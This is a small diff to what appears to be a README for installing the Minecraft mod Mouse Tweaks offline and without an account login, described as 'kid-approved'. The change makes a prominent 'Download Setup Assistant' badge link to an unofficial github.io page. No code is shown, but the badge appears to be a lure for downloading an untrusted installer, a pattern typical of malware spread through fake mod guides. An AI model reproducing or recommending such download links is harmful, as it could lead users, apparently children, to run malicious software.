@@ -1,6 +1,6 @@
 # Mouse Tweaks — Offline Installation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](mouse-tweaks-setup-assistant.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mouse-tweaks-setup-assistant.github.io/.github)
 
 A friendly, kid-approved manual that shows you how to install the **Mouse Tweaks** mod on a computer without Internet access or a Minecraft account login.
 
